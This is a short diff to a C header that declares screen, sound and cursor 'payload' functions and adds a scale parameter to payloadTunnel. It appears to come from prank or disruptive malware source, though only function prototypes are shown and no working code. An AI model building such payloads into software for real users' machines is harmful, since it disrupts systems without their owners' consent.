@@ -13,7 +13,7 @@ PAYLOAD payloadMessageBox(LPWSTR text, LPWSTR label, int style);
 PAYLOAD payloadReverseText();
 PAYLOAD payloadSound();
 PAYLOAD payloadGlitch();
-PAYLOAD payloadTunnel();
+PAYLOAD payloadTunnel(int scale);
 PAYLOAD payloadDrawErrors();
 PAYLOAD payloadInvertScreen();
 PAYLOAD payloadCursor(int power);
